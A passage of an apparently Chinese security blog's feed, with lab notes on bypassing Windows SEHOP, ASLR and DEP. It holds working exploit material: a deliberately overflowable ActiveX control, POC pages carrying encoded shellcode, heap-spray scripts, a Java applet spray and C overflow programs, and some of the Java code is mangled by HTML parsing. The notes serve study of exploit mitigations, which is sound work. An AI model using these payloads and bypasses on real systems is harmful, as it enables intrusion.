      <content type="html"><![CDATA[<h3 id="1-SEHOP简介"><a href="#1-SEHOP简介" class="headerlink" title="1. SEHOP简介"></a>1. SEHOP简介</h3><p>SEHOP(Structured Exception Handling Overwrite Protection)是一种比SafeSEH更为严厉的保护机制。截至2009年，Windows Vista SP1、Windows 7、Windows Server 2008和Windows Server 2008 R2均支持SEHOP。</p>
<p>SEHOP在Windows Server 2008是默认启用，而在Windows Vista和Windows 7中SEHOP默认是关闭的，可以通过下面两种方法启用SEHOP：</p>
<ol>
<li>手工在注册表中HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session\Manager\kernel下面找到DisableExceptionChainValidation项，将其值设置为0，即可以启用SEHOP</li>
</ol>
<p>SEHOP的核心任务是检查这条SEH链的完整性，在程序转入异常处理前SEHOP会检查SEH链上最后一个异常处理函数是否为系统固定的终极异常处理函数。如果是，则说明这条SEH链没有被破坏，程序可以执行当前的异常处理函数；如果检测到最后一个异常处理函数不是最终的默认异常处理，则说明SEH链被破坏，可能发生了SEH覆盖攻击，程序将不会去执行当前的异常处理函数。</p>
<p>验证代码如下：</p>
<pre><code>
BOOL RtlIsValidHandler(handler)
{
        if (handler is in an image) {
                if (image has the IMAGE_DLLCHARACTERISTICS_NO_SEH flag set)
                        return FALSE;
                if (image has a SafeSEH table)
                if (handler found in the table)
                        return TRUE;
                else
                        return FALSE;
                if (image is a .NET assembly with the ILonly flag set)
                        return FALSE;
                // fall through
        }
        if (handler is on a non-executable page) {
                if (ExecuteDispatchEnable bit set in the process flags)
                        return TRUE;
                else
                // enforce DEP even if we have no hardware NX
                raise ACCESS_VIOLATION;
        }
        if (handler is not in an image) {
                if (ImageDispatchEnable bit set in the process flags)
                        return TRUE;
                else
                        return FALSE; // don't allow handlers outside of images
        }
// everything else is allowed
return TRUE;
}
[...]
// Skip the chain validation if the
DisableExceptionChainValidation bit is set
if (process_flags & 0x40 == 0) {
        // Skip the validation if there are no SEH records on the
        // linked list
        if (record != 0xFFFFFFFF) {
                // Walk the SEH linked list
                do {
                        // The record must be on the stack
                        if (record < stack_bottom || record > stack_top)
                                goto corruption;
                        // The end of the record must be on the stack
                        if ((char*)record + sizeof(EXCEPTION_REGISTRATION) > stack_top)
                                goto corruption;
                        // The record must be 4 byte aligned
                        if ((record & 3) != 0)
                                goto corruption;
                        handler = record->handler;
                        // The handler must not be on the stack
                        if (handler >= stack_bottom && handler < stack_top)
                                goto corruption;
                        record = record->next;
                } while (record != 0xFFFFFFFF);
                // End of chain reached
                // Is bit 9 set in the TEB->SameTebFlags field?
                // This bit is set in ntdll!RtlInitializeExceptionChain,
                // which registers FinalExceptionHandler as an SEH handler
                // when a new thread starts.
                if ((TEB->word_at_offset_0xFCA & 0x200) != 0) {
                        // The final handler must be ntdll!FinalExceptionHandler
                        if (handler != &FinalExceptionHandler)
                                goto corruption;
                }
        }
}
</code></pre>

<h3 id="2-攻击SEHOP的理论方法"><a href="#2-攻击SEHOP的理论方法" class="headerlink" title="2. 攻击SEHOP的理论方法"></a>2. 攻击SEHOP的理论方法</h3><p>作为对SafeSEH强有力的补充，SEHOP检查是在SafeSEH的RtlIsValidHandler函数校验前进行的，也就是说利用攻击加载模块之外的地址、堆地址和未启用SafeSEH模块的方法都行不通了。理论上还有三条路可以：</p>
<ol>
<li>不去攻击SEH，而是攻击函数返回地址或者虚函数等</li>
<li>利用未启用SEHOP的模块</li>
<li>伪造SEH链</li>
</ol>
]]></content>
      
        <categories>
            
            <category> 安全技术 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> windows </tag>
            
            <tag> SEH </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[攻击ASLR的方法]]></title>
      <url>/2017/07/14/%E6%94%BB%E5%87%BBASLR%E7%9A%84%E6%96%B9%E6%B3%95/</url>
      <content type="html"><![CDATA[<p>攻击ASLR的方式很多，这里主要讲攻击未启用ASLR的模块、利用部分覆盖进行定位内存地址、利用Heap Spray技术定位内存地址、利用java applet heap spray技术定位内存地址、为.NET控件禁用ASLR</p>
<h3 id="1-攻击未启用ASLR的模块"><a href="#1-攻击未启用ASLR的模块" class="headerlink" title="1. 攻击未启用ASLR的模块"></a>1. 攻击未启用ASLR的模块</h3><p>ASLR仅仅只是安全机制，不是行业标准，不支持ASLR的软件很多，它们的加载基址固定，如果能够在当前控件中找到这样的模块，就可以利用它里面的指令作跳板，无视ASLR。Adobe Player ActiveX9就不支持ASLR。</p>
<p>我们可以使用下面的方式测试：</p>
<ol>
<li>具有溢出漏洞的ActiveX控件</li>
<li>不启用ASLR的Flash9e.ocx</li>
<li>可以触发ActiveX控件溢出漏洞的POC页面</li>
</ol>
<h4 id="1-1-ActiveX、POC代码"><a href="#1-1-ActiveX、POC代码" class="headerlink" title="1.1 ActiveX、POC代码"></a>1.1 ActiveX、POC代码</h4><pre><code>
void CVulnerAXCtrl::test(LPCTSTR str)
{
    // AFX_MANAGE_STATE(AfxGetStaticModuleState());
    // TODO: Add your dispatch handler code here
    printf("aaaa");
    char dest[100];
    sprintf(dest, "%s", str);
}
</code></pre>

<font color="#f00">这里面有一个巨大的坑点，就是在vista上安装好了adobe player activex 9之后，需要重启，否则在IE上打不开map.swf文件</font>

<p>POC.html</p>
<pre><code>
&lt;html&gt;
&lt;body&gt;
&lt;object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=9,0,115,0" width="160" height="260"&gt;  
&lt;param name="movie" value="map.swf" /&gt;  
&lt;param name="quality" value="high" /&gt;  
&lt;embed src="map.swf" quality="high" pluginspage="http://www.adobe.com/shockwave/download/download.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" width="160" height="260"&gt;&lt;/embed&gt;
&lt;/object&gt; 
&lt;object classid="clsid:2554812E-4AE1-4FB0-8F6B-9C5E824D1B2D" id="test"&gt;&lt;/object&gt;
&lt;script&gt;
var s = "\u9090";
while (s.length &lt; 54) {
    s += "\u9090";
}
s += "\uEC2F\u3015\u9090\u9090";
s += "\u68fc\u0a6a\u1e38\u6368\ud189\u684f\u7432\u0c91\uf48b\u7e8d\u33f4\ub7db\u2b04\u66e3\u33bb\u5332\u7568\u6573\u5472\ud233\u8b64\u305a\u4b8b\u8b0c\u1c49\u098b\u698b\uad08\u6a3d\u380a\u751e\u9505\u57ff\u95f8\u8b60\u3c45\u4c8b\u7805\ucd03\u598b\u0320\u33dd\u47ff\u348b\u03bb\u99f5\ube0f\u3a06\u74c4\uc108\u07ca\ud003\ueb46\u3bf1\u2454\u751c\u8be4\u2459\udd03\u8b66\u7b3c\u598b\u031c\u03dd\ubb2c\u5f95\u57ab\u3d61\u0a6a\u1e38\ua975\udb33\u6853\u6577\u7473\u6668\u6961\u8b6c\u53c4\u5050\uff53\ufc57\uff53\uf857";
test.test(s);
&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>

<h4 id="1-2-实验内容"><a href="#1-2-实验内容" class="headerlink" title="1.2 实验内容"></a>1.2 实验内容</h4><p><b>实验内容</b></p>
<ol>
<li>为了直观反映ASLR，本次不是用ActiveX控件不使用GS</li>
<li>通过WEB页面同时加载具有溢出漏洞的ActiveX和Flash9e.ocx</li>
<li>又有IE7和DEP是关闭的，所以不用考虑DEP影响</li>
<li>函数test存在典型的溢出</li>
<li>Flash9k.ocx未启用ASLR，所以其加载地址是固定的，只需要在其内部寻找合适的跳板指令来跳转到shellcode</li>
</ol>
<p><b>实验环境</b></p>
<table>
<thead>
<tr>
<th></th>
<th>推荐使用环境</th>
<th>备注</th>
</tr>
</thead>
<tbody>
<tr>
<td>操作系统</td>
<td>Windows Vista SP0</td>
<td></td>
</tr>
<tr>
<td>DEP状态</td>
<td>Optin</td>
<td>Vista默认状态</td>
</tr>
<tr>
<td>浏览器</td>
<td>IE7</td>
<td></td>
</tr>
<tr>
<td>Flash Player版本</td>
<td>9.0.115</td>
</tr>
</tbody>
</table>
<p>经过某次测试，得到溢出字符串的起始地址0x0337F4B4<br>返回地址所在栈中地址：0x0337F520。所以覆盖返回地址需要填充108个0x90，也即54个\u9090</p>
<p>书上的解释：<br>我们使用0x1014D286处的MOV EAX,EDX RETN 8来调整EAX，而作为机器码时，其代表：<br>86D2    XCHG DL,DL<br>1410     ADC AL, 10<br>可以看出其不会对正常的程序有影响。<br>接下来用4字节的0x90填充消除test函数返回时的4字节偏移。<br>接着是用0x1012E78A来(JMP ESI)跳转至shellcode<br>跟着是0x90填充</p>
<p>实验测试：<br>0x3015EC2F: jmp esp</p>
<font color="#f00">POC中的第一个classid的值一般不变，对应的cab应该与安装的flash版本一致。<br>第一个object的作用是提前加载swf文件，这样在调试的时候就能看到Flash9e.ocx内容</font>

<h3 id="2-利用部分覆盖进行定位内存地址"><a href="#2-利用部分覆盖进行定位内存地址" class="headerlink" title="2. 利用部分覆盖进行定位内存地址"></a>2. 利用部分覆盖进行定位内存地址</h3><p>映像随机化只会对映像加载基址的前2个字节做随机化处理。</p>
<h4 id="2-1-实验代码"><a href="#2-1-实验代码" class="headerlink" title="2.1 实验代码"></a>2.1 实验代码</h4><pre><code>
#include "stdafx.h"
#include "stdlib.h"

char shellcode[] = 
    "\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
    "\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"
    "\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"
    "\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"
    "\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"
    "\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"
    "\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"
    "\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"
    "\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"
    "\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"
    "\x53\xFF\x57\xFC\x53\xFF\x57\xF8"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x00\x30";

char* test()
{
    char tt[256];
    //__asm int 3
    memcpy(tt, shellcode, 262);
    return tt;
}

int _tmain(int argc, _TCHAR* argv[])
{
    char temp[200];
    test();
    return 0;
}
</code></pre>

<h4 id="2-2-实验内容"><a href="#2-2-实验内容" class="headerlink" title="2.2 实验内容"></a>2.2 实验内容</h4><p><b>实验思路</b></p>
<ol>
<li>不启用GS</li>
<li>禁用DEP</li>
<li>test存在典型的溢出漏洞</li>
<li>复制结束后，test函数返回tt字符数组的首地址</li>
<li>在相对程序加载基址0x0000~0xFFFF的范围内，找到一条跳板指令，并用它地址的后两个字节覆盖返回地址的后两个字节</li>
<li>采用这种“相对寻址”的方法来动态确定跳板指令的地址，以实现跳板指令的通用性</li>
</ol>
<p><b>实验环境</b></p>
<table>
<thead>
<tr>
<th></th>
<th>推荐使用环境</th>
<th>备注</th>
</tr>
</thead>
<tbody>
<tr>
<td>操作系统</td>
<td>Windows Vista SP0</td>
<td></td>
</tr>
<tr>
<td>DEP状态</td>
<td>Optin</td>
<td>Vista默认状态</td>
</tr>
<tr>
<td>编辑器</td>
<td>Visual Studio 2008</td>
<td></td>
</tr>
<tr>
<td>优化选项</td>
<td>禁用优化选项</td>
<td></td>
</tr>
<tr>
<td>GS选项</td>
<td>GS关闭</td>
<td></td>
</tr>
<tr>
<td>DEP选项</td>
<td>/NXCOMPAT:NO</td>
<td></td>
</tr>
<tr>
<td>build版本</td>
<td>release</td>
</tr>
</tbody>
</table>
<p>溢出字符串起始地址：0x0016F64C<br>返回地址在栈中地址：0x0016F750</p>
<p>memcpy之后，复制的地址可能不知道，但是复制到哪儿，却是很清楚！</p>
<h3 id="3-利用Heap-Spray技术定位内存地址"><a href="#3-利用Heap-Spray技术定位内存地址" class="headerlink" title="3. 利用Heap Spray技术定位内存地址"></a>3. 利用Heap Spray技术定位内存地址</h3><h4 id="3-1-实验代码"><a href="#3-1-实验代码" class="headerlink" title="3.1 实验代码"></a>3.1 实验代码</h4><p>POC代码</p>
<pre><code>
&lt;html&gt;
&lt;body&gt;
&lt;script&gt;
var nops = unescape("%u9090%u9090");
var shellcode = "\u68fc\u0a6a\u1e38\u6368\ud189\u684f\u7432\u0c91\uf48b\u7e8d\u33f4\ub7db\u2b04\u66e3\u33bb\u5332\u7568\u6573\u5472\ud233\u8b64\u305a\u4b8b\u8b0c\u1c49\u098b\u698b\uad08\u6a3d\u380a\u751e\u9505\u57ff\u95f8\u8b60\u3c45\u4c8b\u7805\ucd03\u598b\u0320\u33dd\u47ff\u348b\u03bb\u99f5\ube0f\u3a06\u74c4\uc108\u07ca\ud003\ueb46\u3bf1\u2454\u751c\u8be4\u2459\udd03\u8b66\u7b3c\u598b\u031c\u03dd\ubb2c\u5f95\u57ab\u3d61\u0a6a\u1e38\ua975\udb33\u6853\u6577\u7473\u6668\u6961\u8b6c\u53c4\u5050\uff53\ufc57\uff53\uf857";
while (nops.length &lt;0x100000/2)
    nops += nops;
nops = nops.substring(0, 0x100000/2-32/2-4/2-2/2-shellcode.length);
nops = nops+shellcode;
var memory = new Array();
for (var i=0; i&lt;200; i++)
    memory[i] += nops;
&lt;/script&gt;
&lt;object classid="clsid:2554812E-4AE1-4FB0-8F6B-9C5E824D1B2D" id="test"&gt;&lt;/object&gt;
&lt;script&gt;
var s = "\u9090";
while (s.length &lt; 54){
    s += "\u9090";
}
s += "\u0C0C\u0C0C";
test.test(s)
&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>

<h4 id="3-2-实验内容"><a href="#3-2-实验内容" class="headerlink" title="3.2 实验内容"></a>3.2 实验内容</h4><p>利用JS申请200个1MB的内存块，观察内存块的起始地址的变化情况。为了便于确定内存块的起始位置，我们在内存块的开始位置放置0x81828182，然后查找来确定内存块的起始位置！</p>
<p>由于Heap Spray是针对浏览器的，所以这儿仍然使用ActiveX来进行演示！为了测试，一般将EIP指向0x0C0C0C0C这个位置！！</p>
<p><b>实验思路</b></p>
<ol>
<li>利用Heap Spray技术在内存中申请200个1MB的内存块来对抗ASLR的随机化处理</li>
<li>每个内存块中包含着0x90填充和shellcode</li>
<li>Heap Spray结束后我们会占领0x0C0C0C0C附近的内存，我们只需要控制程序转入0x0C0C0C0C执行，在执行若干个0x90滑行之后就可以到达shellcode范围并执行</li>
<li>test函数存在典型的溢出漏洞，此处用的VulnerAX.ocx中的ActiveX控件</li>
<li>我们将函数返回地址覆盖为0x0C0C0C0C，函数执行返回执行后就会转入我们申请的内存空间中</li>
</ol>
<h3 id="4-利用java-applet-heap-spray技术定位内存地址"><a href="#4-利用java-applet-heap-spray技术定位内存地址" class="headerlink" title="4. 利用java applet heap spray技术定位内存地址"></a>4. 利用java applet heap spray技术定位内存地址</h3><font color="#f00">Java applet能绕过DEP，是因为JVM分配Java applet申请的空间时将其申请的空间打上了PAGE_EXECUTE_READWRITE标识，让这段内存具有可执行属性!<br>其实在java applet中可以采用类似Heap spray的方法，在JVM的堆空间中申请大量的内存块来对抗ASLR！<br>与Heap Spray不同的是，Heap Spray最大可申请1GB的空间，而每个Java applet最多能申请100MB的空间。为此我们申请90MB空间！！<br></font>

<h4 id="4-1-实验代码"><a href="#4-1-实验代码" class="headerlink" title="4.1 实验代码"></a>4.1 实验代码</h4><p>AppletSpray.java</p>
<pre><code>
import java.applet.*;
import java.awt.*;

public class AppletSpray extends Applet{
    public void init(){
        String shellcode = "\u68fc\u0a6a\u1e38\u6368\ud189\u684f\u7432\u0c91\uf48b\u7e8d\u33f4\ub7db\u2b04\u66e3\u33bb\u5332\u7568\u6573\u5472\ud233\u8b64\u305a\u4b8b\u8b0c\u1c49\u098b\u698b\uad08\u6a3d\u380a\u751e\u9505\u57ff\u95f8\u8b60\u3c45\u4c8b\u7805\ucd03\u598b\u0320\u33dd\u47ff\u348b\u03bb\u99f5\ube0f\u3a06\u74c4\uc108\u07ca\ud003\ueb46\u3bf1\u2454\u751c\u8be4\u2459\udd03\u8b66\u7b3c\u598b\u031c\u03dd\ubb2c\u5f95\u57ab\u3d61\u0a6a\u1e38\ua975\udb33\u6853\u6577\u7473\u6668\u6961\u8b6c\u53c4\u5050\uff53\ufc57\uff53\uf857";
        String[] mem = new String[1024];
        StringBuffer buffer = new StringBuffer(0x100000/2);
        // header (12 bytes)  nop (0x10000-32-2-x) shellcode(x)  NULL(2)
        for(int i=0;i<(0x100000-12-2) 2-shellcode.length();i++)="" buffer.append("\u9090");="" buffer.append(shellcode);="" runtime.getruntime().gc();="" for(int="" j="0;j<90;j++)" mem[j]="" +="buffer.toString();" }="" <="" code=""></(0x100000-12-2)></code></pre>

<p>POC.html</p>
<pre><code>&lt;html&gt;
&lt;body&gt;
&lt;applet code=AppletSpray.class width=300 height=50&gt;&lt;/applet&gt;
&lt;object classid="clsid:2554812E-4AE1-4FB0-8F6B-9C5E824D1B2D" id="test"&gt;&lt;/object&gt;
&lt;script&gt;
var s = "\u9090";
while(s.length &lt; 54){
    s += "\u9090";
}
s += "\u0A0A\u110A";
test.test(s);
&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>

<h4 id="4-2-实验内容"><a href="#4-2-实验内容" class="headerlink" title="4.2 实验内容"></a>4.2 实验内容</h4><p><b>实验环境：</b></p>
<table>
<thead>
<tr>
<th></th>
<th>推荐使用环境</th>
<th>备注</th>
</tr>
</thead>
<tbody>
<tr>
<td>操作系统</td>
<td>Windows Vista SP0</td>
<td></td>
</tr>
<tr>
<td>DEP状态</td>
<td>Optin</td>
<td>该选项任意，因为这种方法可以绕过DEP</td>
</tr>
<tr>
<td>浏览器</td>
<td>IE7</td>
<td></td>
</tr>
<tr>
<td>Java JDK</td>
<td>1.4.2</td>
<td>1.5以前的均可</td>
</tr>
<tr>
<td>目标版本</td>
<td>1.1</td>
<td>脱离JRE，在不具有JRE机器上也能执行</td>
</tr>
<tr>
<td>JRE</td>
<td>不使用JRE</td>
<td></td>
</tr>
<tr>
<td>Applet编译指令</td>
<td>javac 路径\Shellcode.java -target 1.1</td>
</tr>
</tbody>
</table>
<p><b>Java Applet申请空间测试代码</b></p>
<pre><code>
import java.applet.*;
import java.awt.*;

public class AppletSpray extends Applet{
    public void init(){
        String[] mem = new String[1024];
        StringBuffer buffer = new StringBuffer(0x100000/2);
        buffer.append("\u8281\u8182");
        for(int i=0;i<(0x100000-16) 2;i++)="" buffer.append("\u9090");="" runtime.getruntime().gc();="" for(int="" j="0;j<90;j++)" mem[j]="" +="buffer.toString();" }="" <="" code=""></(0x100000-16)></code></pre>

<p><b>Java Applet申请空间起始地址测试结果</b></p>
<table>
<thead>
<tr>
<th>重启前</th>
<th>内存起始地址</th>
<th>重启后</th>
<th>内存起始地址范围</th>
</tr>
</thead>
<tbody>
<tr>
<td>1</td>
<td>0x10010014-0x13F5FDE4</td>
<td>1</td>
<td>0x10010014-0x13F4CC10</td>
</tr>
<tr>
<td>2</td>
<td>0x10010014-0x13F4CC10</td>
<td>2</td>
<td>0x10010014-0x13F5A3E8</td>
</tr>
</tbody>
</table>
<p>从表中可以看出4次试验均有一定的交集，这说明90MB的空间基本上可以对抗ASLR了。不妨使用0x110A0A0A作为切入点，只要将攻击函数的返回地址覆盖为0x110A0A0A，经过若干个0x90的滑行就可以执行shellcode了</p>
<h3 id="5-为-NET控件禁用ASLR"><a href="#5-为-NET控件禁用ASLR" class="headerlink" title="5. 为.NET控件禁用ASLR"></a>5. 为.NET控件禁用ASLR</h3><h4 id="5-1-原理解读"><a href="#5-1-原理解读" class="headerlink" title="5.1 原理解读"></a>5.1 原理解读</h4><p>当.NET控件的IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE标识移除后，这个.NET控件依然会随机加载。</p>
<p>ASLR对PE文件是否启用随机化处理的校验过程：</p>
<pre><code>
if(!(pBinaryInfo->pHeaderInfo->usDllCharacteristics & IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE) && 
!(pBinaryInfo->pHeaderInfo->bFlags & PINFO_IL_ONLY_IMAGES) &&
!(_MmMoveImages == -1))
{
    _MiNoRelocate++;
    return 0;
}
</code></pre>

<p>从代码中可以看出，只要满足下列任意条件就会对PE文件进行随机化处理</p>
<ol>
<li>PE头含有IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE标识</li>
<li>IL-Only文件，这是对.NET文件进行了特殊照顾</li>
<li>_MmMoveImages 值为-1</li>
</ol>
<p>由上可以若一个文件是IL-Only文件，无论是否设置了IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE标识，都会随机化加载。而加载到浏览器中的.NET控件恰恰是IL-Only的。</p>
<p>系统验证.NET是否是IL-Only文件过程</p>
<pre><code>
if(((pCORHeader->MajorRuntimeVersion>2)|(pCORHeader->MajorRuntimeVerion == 2 && pCORHeader->MinorRuntimeVersion>=5)) &&
(pCORHeader->Flags & COMIMAGE_FLAGS_ILONLY))
{
    pImageControlArea->pBinaryInfo->pHeaderInfo->bFlags != PINFO_IL_ONLY_IMAGE;
    ……
}
</code></pre>

<p>通过分析代码，可以发现当系统在检查一个.NET文件是否具有COMIMAGE_FLAGS_ILONLY标识前分别对.NET文件运行时版本号进行判断，如果版本号低于2.5则不运行COMIMAGE_FLAGS_ILONLY标识校验，这个文件就不会被认定为IL-Only！</p>
<p>如果.NET文件被指定加载基址，而其不包含IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE标识，又不被认定为IL-Only，就可以不被ASLR</p>
<h4 id="5-2-实验工具"><a href="#5-2-实验工具" class="headerlink" title="5.2 实验工具"></a>5.2 实验工具</h4><p>我们可以使用CFF Explorer软件来修改.NET控件的PE头<font color="#0f0">[该软件在吾爱破解工具包中有]</font></p>
<p>首先去掉文件IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE标识，用CFF Explorer打开DEP_NETDLL.dll后，点击Optional header-&gt;DllCharacteristics进行设置<br><img src="/images/2017-07-14/remove_dll_characteristics.jpg" alt="去掉IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE标识"></p>
<p>然后设置.NET控件的运行版本号，修改至小于2.5即可。在.NET Directory选项页中设置，修改完之后保存即可</p>
<h4 id="5-3-实验测试"><a href="#5-3-实验测试" class="headerlink" title="5.3 实验测试"></a>5.3 实验测试</h4><p>本实验测试沿用<a href="/2017/07/12/攻击DEP的方法-下/">利用.NET绕过DEP</a>，不过不同的是本次实验是在Vista上完成的</p>
]]></content>
      
        <categories>
            
            <category> 安全技术 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> windows </tag>
            
            <tag> ASLR </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[内存随机化保护(ASLR)简介]]></title>
      <url>/2017/07/14/%E5%86%85%E5%AD%98%E9%9A%8F%E6%9C%BA%E5%8C%96%E4%BF%9D%E6%8A%A4-ASLR-%E7%AE%80%E4%BB%8B/</url>
      <content type="html"><![CDATA[<p>ASLR(Address Space Layout Randomization)技术就是通过加载程序的时候不再使用固定的基址加载，从而干扰shellcode定位的一种保护机制。</p>
<p>支持ASLR的程序在其PE头中会设置IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE标识来说明其支持ASLR。从VS 2005 SP1开始加入/dynamicbase链接选项来帮我们完成这个任务。本书使用VS 2008(VS 9.0)中，通过Project-&gt;project Properties-&gt;Configuration Properties-&gt;Linker-&gt;Advanced-&gt;Randomized Base Address选项对/dynamicbase链接选项进行设置。</p>
<p>ASLR一般分为映像随机化、堆栈随机化、PEB与TEB随机化</p>
<h3 id="1-映像随机化"><a href="#1-映像随机化" class="headerlink" title="1. 映像随机化"></a>1. 映像随机化</h3><p>映像随机化是在PE文件映射到内存时，对其加载的虚拟地址进行随机化处理，这个地址在系统启动时确定，系统重启后该地址会变化。</p>
<p>以IE为例<br><img src="/images/2017-07-14/aslr_image.jpg" alt="对比"></p>
<p>系统中设置了映像随机化的开关，用户可以通过设置注册表中的HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\MoveImages的键值来设定映像随机化的工作模式</p>
<ul>
<li>0： 映像随机化被禁用</li>
<li>-1： 强制对可随机化的映像进行处理，无论是否设置IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE标识</li>
<li>其他值：正常工作模式，只对具有随机化处理标识的映像进行处理</li>
</ul>
<h3 id="2-堆栈随机化"><a href="#2-堆栈随机化" class="headerlink" title="2. 堆栈随机化"></a>2. 堆栈随机化</h3><p>在运行时随机的选择堆栈的基址，与映像基址随机化不同的是堆栈的基址不是在系统启动的时候确定的，而是在打开程序的时候确定的</p>
<pre><code>
int _tmain(int argc, _TCHAR* argv[])
{
    char * heap = (char *)malloc(100);
    char stack[100];
    printf("Address of heap:%#0.4x\nAddress of stack %#0.4x", heap, stack);
    getchar();
    return 0;
}
</code></pre>

<p>使用win xp和win vista进行对比，如下：<br>win xp两次运行的结果：<br><img src="/images/2017-07-14/win_xp_heap_stack.jpg" alt="win_xp两次运行的结果"><br>win vista两次运行的结果：<br><img src="/images/2017-07-14/win_vista_heap_stack.jpg" alt="win_vista两次运行的结果"></p>
<h3 id="3-PEB与TEB"><a href="#3-PEB与TEB" class="headerlink" title="3. PEB与TEB"></a>3. PEB与TEB</h3><p>PEB与TEB随机化在win xp sp2就引入了，不再使用固定的PEB基址0x7FFDF00和TEB基址0x7FFDE00</p>
<font color="#f00">获取当前进程的TEB和PEB很简单，TEB存放在FS:0和FS:[0x18]处，PEB存放在TEB偏移0x30处的位置。获取TEB、PEB的方法如下：</font>

<pre><code>
int _tmain(int argc, _TCHAR* argv[])
{
    unsigned int teb;
    unsigned int peb;
    __asm{
        mov eax, FS:[0x18]
        mov teb, eax
        mov eax, dword ptr [eax + 0x30]
        mov peb, eax
    }
    printf("PEB:%#x\nTEB:%#x", peb, teb);
    getchar();
    return 0;
}
</code></pre>

<p>PEB、TEB随机化测试:<br><img src="/images/2017-07-14/aslr_teb_peb.jpg" alt="PEB、TEB随机化"></p>
<h3 id="4-ASLR存在的缺陷"><a href="#4-ASLR存在的缺陷" class="headerlink" title="4. ASLR存在的缺陷"></a>4. ASLR存在的缺陷</h3><ol>
<li>映像随机化测试时各模块的入口点（Entry那列）地址的低位2个字节时不变的，也就是说映像随机化只是对加载基址的前2字节做了随机处理</li>
<li>堆栈随机化可以防止精准攻击，但是使用JMP ESP跳板、浏览器攻击中的heap spray等技术是不需要精准跳转</li>
<li>PEB与TEB的随机化的程度较差，而且即使做到完全随机，依然可以使用其他方法获取当前进程的PEB与TEB</li>
</ol>
]]></content>
      
        <categories>
            
            <category> 安全技术 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> windows </tag>
            
            <tag> ASLR </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[攻击DEP的方法(下)——可执行内存、.Net、Java Applet]]></title>
      <url>/2017/07/12/%E6%94%BB%E5%87%BBDEP%E7%9A%84%E6%96%B9%E6%B3%95-%E4%B8%8B/</url>
      <content type="html"><![CDATA[<h3 id="1-利用可执行内存"><a href="#1-利用可执行内存" class="headerlink" title="1. 利用可执行内存"></a>1. 利用可执行内存</h3><h4 id="1-1-实验代码"><a href="#1-1-实验代码" class="headerlink" title="1.1 实验代码"></a>1.1 实验代码</h4><pre><code>
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;stdio.h&gt;
#include &lt;windows.h&gt;

char shellcode[] = 
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90"
    "\x8A\x17\x84\x7C"            // pop eax retn
